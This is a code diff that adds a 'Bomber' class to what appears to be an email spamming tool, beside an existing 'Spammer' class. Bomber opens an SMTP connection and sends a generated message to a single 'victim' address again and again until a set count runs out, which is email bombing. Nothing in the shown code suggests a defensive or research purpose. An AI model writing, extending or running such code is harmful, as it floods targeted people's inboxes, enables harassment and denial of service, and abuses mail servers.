@@ -48,3 +48,28 @@ class Spammer(Sender):
         super().stop()
         del self.victims
 
+class Bomber(Sender):
+    def __init__(self, server: SMTPConnection, victim: str, options: dict, sends: int, timeout: int = 1) -> None:
+        super().__init__(server, options, timeout)
+        self.victim = victim
+        self.options['victim'] = victim.split('@')[0]
+        self.options['email'] = victim
+        self.sends = sends
+        self.start()
+    
+    def run(self) -> None:
+        email = self.generator.gen_email(self.options)
+        while self.alive and self.sends > 0:
+            try:
+                self.server.sendmail(self.victim, email)
+            except:
+                break
+            self.sends -= 1
+            sleep(self.timeout)
+
+    def sends_left(self) -> int:
+        return self.sends
+
+    def stop(self):
+        super().stop()
+        del self.victim
